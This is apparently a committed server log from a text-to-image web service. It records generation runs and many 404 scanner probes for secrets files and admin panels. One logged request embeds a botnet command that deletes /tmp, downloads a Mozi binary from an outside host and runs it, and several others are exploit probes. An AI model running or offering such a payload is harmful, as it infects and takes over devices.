+INFO:     127.0.0.1:36208 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     216.251.130.74:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     195.178.120.44:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     195.178.120.44:0 - "POST /HNAP1/ HTTP/1.0" 404 Not Found
+INFO:     167.94.138.33:57722 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.94.138.33:38114 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.94.138.33:41002 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     103.216.234.66:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.7:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36222 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.126.19:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36226 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.126.19:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36230 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36232 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.126.19:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.126.19:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.71.95:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.71.95:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.71.95:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.71.95:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36246 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36248 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36250 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36252 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     109.237.98.226:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36258 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36260 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36262 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     45.90.63.138:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     176.53.221.10:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36268 - "GET /version HTTP/1.0" 404 Not Found
+INFO:     147.182.218.216:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     59.83.208.106:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     220.196.160.151:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36276 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36278 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /wordpress HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Wordpress HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /WORDPRESS HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /WordPress HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /wp HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Wp HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /WP HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /old HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Old HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /OLD HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /oldsite HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /new HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /New HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /NEW HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /wp-old HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /2022 HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /2020 HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /2019 HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /2018 HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /backup HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /test HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Test HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /TEST HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /demo HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /bc HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /www HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /WWW HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Www HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /2021 HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /main HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /old-site HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /bk HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Backup HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /BACKUP HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /SHOP HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Shop HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /shop HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /bak HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /sitio HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /bac HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /sito HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /site HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Site HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /SITE HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /blog HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /BLOG HTTP/1.0" 404 Not Found
+INFO:     185.137.122.49:0 - "HEAD /Blog HTTP/1.0" 404 Not Found
+INFO:     193.118.55.162:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36378 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     92.118.39.109:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     3.144.41.80:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     3.144.41.80:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     3.144.244.222:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     3.144.244.222:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     77.49.145.62:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.81.212:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.81.212:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.81.212:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.81.212:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36400 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36402 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36404 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36406 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     173.252.87.20:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     173.252.127.1:0 - "GET /?fbclid=IwAR1sTeQjmFP3VeQsNn-xrkk8Sg9Lc01Aw-pP7qF1Z_wdCU0s7YImEWVSENM HTTP/1.0" 404 Not Found
+INFO:     173.252.127.1:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36416 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.180.143.71:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36422 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36426 - "GET / HTTP/1.0" 404 Not Found
+INFO:     165.22.29.115:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36430 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36432 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36434 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36436 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36438 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36440 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     31.220.3.140:37344 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     104.199.31.214:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36446 - "GET / HTTP/1.0" 404 Not Found
+INFO:     205.210.31.138:58230 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36448 - "GET / HTTP/1.0" 404 Not Found
+INFO:     137.119.38.151:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36452 - "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0" 404 Not Found
+INFO:     192.241.218.17:54324 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36454 - "GET / HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET /client/get_targets HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET /upl.php HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET /geoip/ HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     170.64.161.214:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     36.68.88.237:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     40.122.244.95:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     39.155.134.145:0 - "GET /v1/agent/self HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36478 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36480 - "GET /jmx-console/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36482 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36484 - "GET /web-console/ServerInfo.jsp HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36486 - "GET /web-console/ServerInfo.jsp HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36488 - "GET /manager/html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36490 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36492 - "GET /pma/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36494 - "GET /phpmyadmin/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36496 - "GET /phpMyAdmin/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36500 - "GET /ab2g HTTP/1.0" 404 Not Found
+INFO:     221.122.67.130:0 - "GET /v1/agent/self HTTP/1.0" 404 Not Found
+INFO:     64.62.197.203:37585 - "GET / HTTP/1.1" 404 Not Found
+INFO:     64.62.197.198:47733 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     64.62.197.199:34533 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     162.243.138.9:0 - "GET /hudson HTTP/1.0" 404 Not Found
+INFO:     185.209.160.120:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     205.210.31.57:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     205.210.31.163:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.230.86.203:0 - "GET / HTTP/1.0" 404 Not Found
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.49it/s]  8%|▊         | 2/25 [00:00<00:10,  2.19it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.55it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.78it/s] 20%|██        | 5/25 [00:01<00:06,  2.93it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.01it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.07it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.12it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.18it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.20it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.20it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.20it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.21it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.21it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.21it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.22it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.22it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.22it/s]100%|██████████| 25/25 [00:08<00:00,  3.22it/s]100%|██████████| 25/25 [00:08<00:00,  3.07it/s]
+File: ../gen_images/t2i_test_byPostman_白日依山尽, 黄河入海流, 中国画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:36514 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     64.62.197.226:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.128.232.149:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     64.62.197.220:0 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     51.254.59.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     208.80.194.42:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     192.241.216.8:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36534 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36536 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     45.90.60.19:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.90.63.120:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36542 - "GET / HTTP/1.0" 404 Not Found
+INFO:     147.182.218.216:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36546 - "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36548 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36550 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36552 - "GET /.git/config HTTP/1.0" 404 Not Found
+original image shape: (960, 558, 3)
+Do not need resize!
+Image2Image Processing is Done, but it exists erros!
+INFO:     127.0.0.1:36554 - "POST /image2image HTTP/1.0" 200 OK
+original image shape: (960, 558, 3)
+Do not need resize!
+Image2Image Processing is Done, but it exists erros!
+INFO:     127.0.0.1:36556 - "POST /image2image HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.45it/s]  8%|▊         | 2/25 [00:00<00:10,  2.16it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.51it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.75it/s] 20%|██        | 5/25 [00:01<00:06,  2.91it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.99it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.06it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.18it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.17it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.18it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.19it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.20it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.19it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.20it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.20it/s] 80%|████████  | 20/25 [00:06<00:01,  3.19it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.20it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.19it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.20it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.05it/s]
+File: ../gen_images/0a7rwimu4of0_白日依山尽,,艺术创想.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:36558 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     107.170.252.15:0 - "GET /portal/redlion HTTP/1.0" 404 Not Found
+INFO:     107.170.241.38:0 - "GET /actuator/health HTTP/1.0" 404 Not Found
+INFO:     185.225.74.240:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     156.146.35.170:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     223.111.175.113:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36608 - "GET / HTTP/1.0" 404 Not Found
+INFO:     5.235.242.233:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     171.25.193.79:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36614 - "GET ///remote/fgt_lang?lang=/../../../..//////////dev/ HTTP/1.0" 404 Not Found
+INFO:     109.237.97.180:0 - "GET /.env HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.200.153:40892 - "GET / HTTP/1.1" 404 Not Found
+INFO:     152.32.200.153:45286 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     152.32.200.153:47594 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.200.153:49742 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36618 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36620 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36622 - "GET /remote/fgt_lang HTTP/1.0" 404 Not Found
+INFO:     59.36.175.46:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36626 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36628 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36630 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36636 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36642 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36644 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36646 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     20.200.220.140:0 - "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
+INFO:     20.200.220.140:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     179.183.158.253:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36654 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.68.9:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     66.249.68.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.79.62:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     66.249.79.62:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.68.5:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.79.62:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36674 - "GET /explore HTTP/1.0" 404 Not Found
+INFO:     123.11.223.12:0 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.11.223.12:43993/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36678 - "GET / HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36684 - "GET / HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     185.209.160.120:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36690 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36692 - "GET /owa/auth/logon.aspx?replaceCurrent=1&url=https://170.106.171.13/ecp HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36694 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36696 - "GET / HTTP/1.0" 404 Not Found
+INFO:     128.90.173.155:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /server-status HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /config.json HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /telescope/requests HTTP/1.0" 404 Not Found
+INFO:     35.216.169.119:0 - "GET /info.php HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     138.68.150.12:54452 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     138.68.150.12:54470 - "GET /api/islogged HTTP/1.1" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     107.170.233.4:0 - "GET /druid/index.html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36720 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36722 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36724 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36726 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:36728 - "GET / HTTP/1.0" 404 Not Found
+INFO:     104.156.149.37:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     46.98.2.43:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:36736 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.65.111.248:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     178.128.221.104:42214 - "GET / HTTP/1.1" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /feed/ HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.242.234.175:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     216.251.130.74:0 - "GET / HTTP/1.0" 404 Not Found
